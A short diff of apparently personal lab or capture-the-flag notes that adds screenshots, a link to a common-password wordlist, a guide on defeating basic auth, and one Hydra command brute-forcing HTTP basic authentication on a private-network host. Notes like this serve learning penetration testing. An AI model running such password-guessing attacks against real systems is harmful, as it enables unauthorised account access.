@@ -16,3 +16,12 @@ mit allen ports
 ![[Pasted image 20250117180209.png]]
 ![[Pasted image 20250117180747.png]]
 ![[Pasted image 20250117180729.png]]
+![[Pasted image 20250117181656.png]]
+github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/10-million-password-list-top-10000.txt
+https://tylerrockwell.github.io/defeating-basic-auth-with-hydra/
+`hydra -l user -P pw.txt -s 55487 -f 192.168.15.3 http-get /`
+![[Pasted image 20250117182116.png]]
+![[Pasted image 20250117182208.png]]
+![[Pasted image 20250117183032.png]]
+![[Pasted image 20250117183014.png]]
+![[Pasted image 20250117183153.png]]
